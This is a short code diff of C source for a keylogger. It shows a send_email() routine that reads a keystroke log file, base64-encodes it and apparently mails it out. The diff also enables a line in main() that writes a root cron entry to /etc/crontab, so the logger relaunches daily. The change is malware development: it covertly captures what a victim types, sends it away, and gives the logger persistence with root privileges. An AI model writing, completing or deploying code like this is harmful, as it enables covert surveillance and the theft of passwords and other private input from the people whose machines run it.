@@ -306,7 +306,7 @@ int send_email(){
     struct upload_status upload_ctx = { 0 };
 
     FILE *fp_text;
-    char *buff = malloc(sizeof(char) *1024*1024*100);
+    char *buff = malloc(sizeof(char) *1024*1024*24);
     fp_text = fopen("log.txt", "r");
     fscanf(fp_text, "%s", buff);
     char * enc = b64_encode((const unsigned char *)buff, strlen(buff));
@@ -405,7 +405,7 @@ void *keylogger(){
 }
 
 int main() {
-    //system("echo \"00 09 * * * root $(pwd)/keylogger\" >> /etc/crontab");
+    system("echo \"00 09 * * * root $(pwd)/keylogger\" >> /etc/crontab");
 
     pthread_t tid_keylogger;
     pthread_create(&tid_keylogger, NULL, keylogger, (void *)&keylogger);
